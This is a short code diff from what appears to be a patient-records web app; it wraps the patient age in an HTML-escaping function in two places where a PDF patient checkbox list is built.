-  list.innerHTML=patients.map(p=>`<label style="display:flex;align-items:center;gap:6px;font-size:.82rem;cursor:pointer"><input type="checkbox" class="pdf-pat-cb" value="${p.id}" style="accent-color:var(--p);cursor:pointer"> ${esc(p.name)} (${p.age} a.)</label>`).join('');
+  list.innerHTML=patients.map(p=>`<label style="display:flex;align-items:center;gap:6px;font-size:.82rem;cursor:pointer"><input type="checkbox" class="pdf-pat-cb" value="${p.id}" style="accent-color:var(--p);cursor:pointer"> ${esc(p.name)} (${esc(p.age)} a.)</label>`).join('');
   document.getElementById('pdf-date-all').checked=true;
   document.getElementById('pdf-date-range').classList.remove('show');
   document.getElementById('pdf-pat-list').style.display='none';
@@ -12046,7 +12207,7 @@ function filterPDFPatients(){
   const list=document.getElementById('pdf-pat-list');
   list.innerHTML=patients
     .filter(p=>!q||p.name.toLowerCase().includes(q))
-    .map(p=>`<label style="display:flex;align-items:center;gap:6px;font-size:.82rem;cursor:pointer;padding:3px 0"><input type="checkbox" class="pdf-pat-cb" value="${p.id}" style="accent-color:var(--p);cursor:pointer"> ${esc(p.name)} (${p.age} a.)</label>`)
+    .map(p=>`<label style="display:flex;align-items:center;gap:6px;font-size:.82rem;cursor:pointer;padding:3px 0"><input type="checkbox" class="pdf-pat-cb" value="${p.id}" style="accent-color:var(--p);cursor:pointer"> ${esc(p.name)} (${esc(p.age)} a.)</label>`)
     .join('');
   if(!list.innerHTML)list.innerHTML='<span style="font-size:.8rem;color:var(--txt2);padding:4px 0">Sin resultados</span>';
 }
